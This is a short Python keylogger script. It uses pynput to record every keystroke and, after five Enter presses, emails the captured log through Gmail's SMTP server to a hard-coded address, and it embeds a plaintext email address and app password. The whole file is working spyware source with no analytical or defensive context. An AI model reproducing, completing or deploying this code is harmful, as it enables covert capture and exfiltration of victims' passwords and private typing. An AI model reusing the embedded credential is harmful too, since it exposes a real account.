import threading
import smtplib
from email.mime.text import MIMEText
from pynput import keyboard

SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587
EMAIL_ADDRESS = 'yeshua200530@gmail.com'
EMAIL_PASSWORD = 'tbum ubqe ilpi hbmj'

enter_count = 0

logged_keys = ""  

def on_press(key):
    global enter_count, logged_keys
    try:
        current_key = key.char
    except AttributeError:
        if key == keyboard.Key.space:
            current_key = " "
        elif key == keyboard.Key.enter:
            current_key = "[ENTER]\n"
        else:
            current_key = f"[{key}]"

    logged_keys += current_key  

    if key == keyboard.Key.enter:
        enter_count += 1
        if enter_count >= 5:
            send_email(logged_keys)
            logged_keys = ""   
            enter_count = 0

def send_email(message):
    msg = MIMEText(message)
    msg['Subject'] = 'Registro de Teclas'
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = EMAIL_ADDRESS

    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg.as_string())

def start_listener():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    listener_thread = threading.Thread(target=start_listener)
    listener_thread.start()